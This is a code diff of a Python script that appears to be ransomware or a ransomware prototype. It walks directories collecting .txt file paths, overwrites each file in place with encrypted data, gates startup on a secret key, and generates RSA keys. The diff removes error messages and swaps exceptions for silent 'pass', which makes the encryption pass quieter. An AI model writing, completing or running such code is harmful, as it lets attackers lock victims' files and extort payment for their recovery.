@@ -9,6 +9,7 @@ import requests
 import csv
 import sys
 
+
 def waitingForKey(key, message="Enter the secret key to start the program: "):
     secret_key = key
     while True:
@@ -65,8 +66,7 @@ def findTxtFile(file_name):
                         continue
                     file_path = os.path.join(root, file)
                     txtFileCounter += 1
-                    progress_bar(8996, txtFileCounter, 50, 'Finding .txt files')
-                    #print("Files Found: ", txtFileCounter, end='\r')
+                    print("Files Found: ", txtFileCounter, end='\r')
                     # Write file_path to a .txt file
                     with open(file_name, "a") as f:
                         f.write(file_path + "\n")
@@ -98,7 +98,6 @@ def decrypt_data(key, encrypted_data):
 
 def encrypt_file(ascii_key, file_path):
     if not os.path.exists(file_path):
-        print(f"File not found {file_path}")
         return
     try:
         with open(file_path, 'r') as f:
@@ -107,12 +106,11 @@ def encrypt_file(ascii_key, file_path):
         with open(file_path, 'wb') as f:
             f.write( encrypted_data )
     except:
-        print(f"Error encrypting {file_path}")
+        pass
 
 
 def decrypt_file(key, file_path):
     if not os.path.exists(file_path):
-        print(f"File not found {file_path}")
         return
     try:
         with open(file_path, "rb") as f:
@@ -121,7 +119,7 @@ def decrypt_file(key, file_path):
         with open(file_path, 'wb') as f:
             f.write(decrypted_data)
     except:
-        print(f"Error decrypting {file_path}")
+        pass
 
 def encrypt_file_paths(key, file_path):
     pathsCount = count_lines(file_path)
@@ -132,6 +130,7 @@ def encrypt_file_paths(key, file_path):
             encrypt_file(key, file_path)
             counter += 1
             progress_bar(pathsCount, counter, 50, 'Encrypting files')
+    print("\n")
 
 def decrypt_file_paths(key, file_path):
     pathsCount = count_lines(file_path)
@@ -142,6 +141,7 @@ def decrypt_file_paths(key, file_path):
             decrypt_file(key, file_path)
             counter += 1
             progress_bar(pathsCount, counter, 50, 'Decrypting files')
+    print("\n")
 
 def generateRSAKeys():
     """Generate an RSA key pair"""
